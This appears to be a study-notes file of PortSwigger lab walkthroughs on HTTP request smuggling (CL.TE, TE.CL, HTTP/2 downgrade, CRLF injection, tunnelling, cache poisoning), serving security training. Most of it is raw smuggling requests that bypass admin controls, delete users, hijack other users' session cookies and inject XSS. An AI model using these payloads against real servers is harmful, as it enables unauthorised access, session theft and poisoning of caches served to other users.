 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store. 
 
***Http request smuggling, basic CL.TE vulnerability***
Http smuggling CL/TE
Content-Length
Transfer-Encoding
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d14f5da1-9aba-408c-b9ae-4fe03952f0f3)

**HTTP request smuggling, basic TE.CL vulnerability**


Using nuclei

Yaml

```
id: TE-CL-http-smuggling
info:
  name: HTTP request smuggling, basic TE.CL vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      x=1
      0
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```
**HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**


Burpesuite request
Will respond with a 404 if successful 
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked
0
GET /404 HTTP/1.1
X-Ignore: X
```


**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**


Burp Request
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
```

**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**


Admin panel block
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a6a57ba3-6804-466c-ae3d-20156a906f01)




Trying CLTE to acccess blocked 
 
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/03085687-89d5-467f-9e03-36dff9b1f6e5)




Exploit:
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

We now have access to admin
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/de26bfa4-72f3-49cd-8ec6-aecb7828e8f5)


To delete user
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3197cc4d-a501-48e0-a562-428315de63d4)



**Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**

Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability:
This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
SOLUTION:
In the lab description, it is clearly stated that the front end supports transfer encoding: chunked but the backend server doesn’t. So access the lab and send the request to the burp repeater.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2537aa5c-c9f8-465d-8ac3-d3f9af0f3534)

Change the request method to POST and remove the unnecessary headers.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/83b49fc0-1404-4a5a-b4d9-c8e809c2496a)

Now we need to add our transfer encoding header. And also don't forget to add the trailing new lines.
We can see we are getting 200 ok response, Now we just need to figure out a way to request /admin which we can not access from the front end because of the security controls.
“Make sure update content length is disabled in repeater”
The next step is to create a Get request to /admin in our POST request’s body.
60 ==> SIZE OF OUR CHUNKED DATA
```
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/56737378-961b-4872-b548-db2155973728)

We can see the admin panel is only available to the local host. To bypass this situation we need to add another host header which has a value of
Payload:
71
```
POST /admin HTTP/1.1
HOST: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/add05481-9ea8-4ac4-b877-5557f7abe6ae)

Now we just need to delete the Carlos user.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7057fb1f-958d-4ad8-afec-aee02fe5f81b)

87 
```
GET /admin/delete?username=carlos HTTP/1.1 
Host: localhost 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 15  x=1 
0
```
This payload will delete the Carlos user.
Now let's see how we can chain this vulnerability to induce XSS in the victim's browser.

From <https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603> 

**Exploiting HTTP request smuggling to reveal front-end request rewriting**
front-end and back-end server, and the front-end server doesn't support chunked encoding.

From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting> 

Intercept request and change to post
Our response should have search result for follow by the rewritten http request

```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

Make note of  `x-nDBWAo` header 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a09771a0-9fb8-4147-ba3a-f0e53e69f265)





Our exploit to get admin
```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-nDBWAo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```


We can now delete the user
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c7f5346a-3229-42db-89aa-1ac2cf9131fa)




```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 170
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-nDBWAo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

**Exploiting HTTP request smuggling to capture other users' requests**

Intercept a comment submit and modify to the following
Increase second Content-Length to meet your need to show session cookie
```
POST / HTTP/1.1
Host: 0acf00500437c75381604dde003600ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 930
Cookie: session=ckjHb97MUxlfsPWlVtKf7m5RBEKuEort

csrf=vztP4gl8AAblrNS6an7vHFX3eZP4lori&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

Send on burpe
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/428cb6ec-50ac-4c15-a606-1670ccee94ad)

Go back and you should see your session cookie in the comments
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/19334f1f-41d8-435f-a3fd-6fd0cfdc69f7)

Copy the session cookie and csrf token and intercept a login request
Modify to your copied session cookie and csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7a8fa68d-d930-4fdd-b8e8-3617180e795e)

Forward request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a0542cf1-3152-4445-b225-b23588691592)

**Exploiting HTTP request smuggling to deliver reflected XSS**

On the comment blog page we notice userAgent with the value of our browser 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2ab52e74-0e53-48d6-bc5a-20fb5a5bd4b9)




Inject an XSS payload into the User-Agent header and observe that it gets reflected: 

From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss> 
```
User-Agent: /><script>alert(1)</script>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/eadf8a18-8521-4ae2-9cd0-5d9a1d242614)




Exploit

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

Will trigger on the next visitor 

**Response queue poisoning via H2.TE request smuggling**

Smuggled arbitrary prefix of body  of http/2 request using chunked encoding 

```
POST / HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 13

0

SMUGGLED
```



Will get a 404 response after to send. Confirmed that you caused the back-end to append the subsequent request to the smuggled prefix
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9412e439-6e75-4eba-a415-7cc61928aeab)




Send the following request to poison the response queue 
```
POST / HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 85

0

GET /x HTTP/1.1
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
```

 Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header. 

You will receive the 404 response to your own request
Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. 
Send 10 ordinary response  to reset.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bc7a5dcb-8dac-4219-a974-f04fbb8415b8)

From <https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling> 





Copy the session cookie and use it to send the following request to the admin panel 

```
GET /admin HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Cookie: session=STOLENESSIONCOOKIE
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dca51d14-bffc-4b67-8714-75db041e3433)





To delete 

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Cookie: session=eiVlUrLVr93i4N4PmuH0J2fKcumc6Hi9
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d71683aa-c5c9-4416-bd10-6a46a388629c)


**H2.CL Request Smuggling (turn off update content length)**


```
POST / HTTP/2
Host: 0a130085036f6110833823da00be0008.web-security-academy.net
Content-Length: 0

SMUGGLED
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fd33dc7f-18c0-41ba-bb7c-2f882e599acb)


• Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix. 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 

Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header: 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/57286361-598c-4808-89b8-5d87e80dd618)










• Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host. 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 

```
POST / HTTP/2
Host: 0a130085036f6110833823da00be0008.web-security-academy.net
Content-Length: 60

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/30ee1e02-8b2f-4099-973e-2e664aebacda)






Go to the exploit server and change the file path to `/resources`. In the body, enter the payload `alert(document.cookie)` then store the exploit.

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 


Resend and confirm that you a redirected to the exploit server 
```
POST / HTTP/2
Host: 0a130085036f6110833823da00be0008.web-security-academy.net
Content-Length: 116

GET /resources HTTP/1.1
Host: exploit-0ad50048033961258315229901bc0095.exploit-server.net/resources
Content-Length: 5

x=1
```

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b59eb779-1305-4f65-b268-988420d01a95)

**HTTP/2 request smuggling via CRLF injection**

Our session cookie is tied to our search history
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29e2adf3-ec1b-4681-b1e2-e03784bf2363)


Removing and refreshing sessions will reset search history so our search is tied to session cookie
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4ae10be1-4f31-4a3a-8b97-82dfbf5bc69f)






To exploit
Add a new header using Response Headers via Inspector  should get a 404 not found 


```
Name 
foo 
Value 
bar\r\n
Transfer-Encoding: chunked
```

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 

In the body, attempt to smuggle an arbitrary prefix as follows: 
```
0 

SMUGGLED
```

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6efa75ce-56ab-4b29-9d67-679150a44d46)





Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8bbc47ea-2fa6-4ec4-961f-ccf6c71de6a0)


Change the body to the following


```
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
```

Our get request indicate that we got the victim user session
Copy and change our session cookie and you should have access to the user 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/35ed1968-a234-44cc-82dc-283743d82f41)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f02f495a-7d6f-414e-bc7e-70e451426a2b)


**HTTP/2 request splitting via CRLF injection**




Change path of get request to no existing path to get a 404 request
/x


To poison we add the following to the response header in inspector tab (shift+return)

```
Name:
foo

Value:
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net
```


Note
If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again. 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f0202da5-fcff-4271-88b2-5704ac1de533)

Send until you get a 302 request
/admin directory
Copy the victim session cookie and replace it and you should be able to delete users 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bda93fb2-7a00-4e2e-8ce7-97ab1efff61c)

**Exploiting HTTP request smuggling to perform web cache poisoning**

Capture a request to next post  and smuggled request with different host header

```
POST / HTTP/1.1
Host: 0a12004404739ba183c707a400300006.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Transfer-Encoding: chunked

0

GET /post/next?postId=4 HTTP/1.1
Host: ANYTHING
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Our  location got redirected to a host of our choice 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7ca4d145-8acb-4e40-9414-e2d15314a0fe)



On our exploit server 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fbb03e4f-562c-4b7d-b47f-e0052c8c9601)


Change our ANYTHING host to our exploit server and intercept a request from /resources/js/tracking.js
Add both to group and Separate connection for each request

```
POST / HTTP/1.1
Host: 0af500e903aec00281f025d700c80007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a8100e9036bc025811d243a016e009e.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Send group
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/74402595-d086-4610-a9d5-1c99f6379ff9)





Notice host changed to our exploit server on Location
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32589dcc-a024-499b-8c49-be751972079e)






Should get an alert textbox when we refresh site

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ac612921-6dbb-4fbf-9df2-be98df4f6a19)

**Exploiting HTTP request smuggling to perform web cache deception**

```
Login  
Capture response and changed to smuggle
POST / HTTP/1.1
Host: 0ab400b6040218b282d3152200d6004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```





Open home link in incognito 



We can use burpe search to look for api key (PRO version) but saw it in the following 

**Exploiting HTTP request smuggling to perform web cache deception**

Login  
Capture response and changed to smuggle
```
POST / HTTP/1.1
Host: 0ab400b6040218b282d3152200d6004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fdaed396-17a7-4c6b-a2ec-7ae761193193)





Open home link in incognito 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f4c81f0b-599b-4878-8fff-0a006dee5b65)



We can use burpe search to look for api (PRO version) but saw it in the following 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9c4cbcec-8fc0-407e-abd4-d395db61aeec)

**Bypassing access controls via HTTP/2 request tunnelling**

Capture http2 request and add the following value to inspector 
```
Name 
foo: bar\r\n
Host: abc 
Value 
xyz
```

Observe that the error response indicates that the server processes your injected host, confirming that the lab is vulnerable to CRLF injection via header names. 

From <https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1f2f58a8-731e-4a08-8c24-a402bf9e7a2c)






In browser notice our search are reflected
/?search=asfasfafs
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/49c86bf8-e7ba-4f2a-b3ee-2d2b270f5a5b)





Capture search request and upgrade to http/2


Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows: 
```
Name 
foo: bar\r\n
Content-Length: 500\r\n
\r\n
search=x 
Value 
xyz
``` 

From <https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling> 


We got our frontend-key

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/65e492f6-88ef-44b7-83cc-9640727a9546)




Change our request method to head , We get a "received only.." cause our content is too big

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/63b87198-2beb-4001-b61e-c6e08bc01099)


Change our path to login we get the right amount of content. We can now delete a user. 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b066cdc9-4530-44ee-bb17-f3dc54b98510)



To delete a user
```
foo: bar

GET /admin/delete?username=carlos HTTP/1.1
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 2633746179349812

```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5328beda-46d1-4b8d-9bc1-84046208b820)



Will error out but we deleted the user

**Web cache poisoning via HTTP/2 request tunnelling**

To check for poisoning use the arbitrary parameter. Make sure request is http/2

```
/?cachebuster=1 HTTP/1.1
Foo: bar
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e85e6112-3d70-43b9-bec3-2f89376818a0)


Change the request method to HEAD and the header to another arbitrary endpoint

```
/?cachebuster=3 HTTP/1.1
Host: 0a32002d03a09fef8257c5f6005d0022.web-security-academy.net

GET /post?postId=3 HTTP/1.1
Foo: bar
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1ee73514-1e4e-43ee-b9fa-051a194337e3)





To get our xss we can use the following but will get a timeout cause we need to overflow the content length

```
/?cachebuster=3 HTTP/1.1
Host: 0a32002d03a09fef8257c5f6005d0022.web-security-academy.net

GET /resources?<script>alert(1)</script> HTTP/1.1
Foo: bar
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d815daf8-b57a-4aa7-b5c1-b3612e8ae7a2)








Look at our previous and saw our content-length was 8xxx so we went above(8755) it using the following to generate A on python. Remove the arbitrary ?cachebuster and change to path to resources
`print('a' * 8755 )`

```
/ HTTP/1.1
Host: 0a32002d03a09fef8257c5f6005d0022.web-security-academy.net

GET /resources?<script>alert(1)</script>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa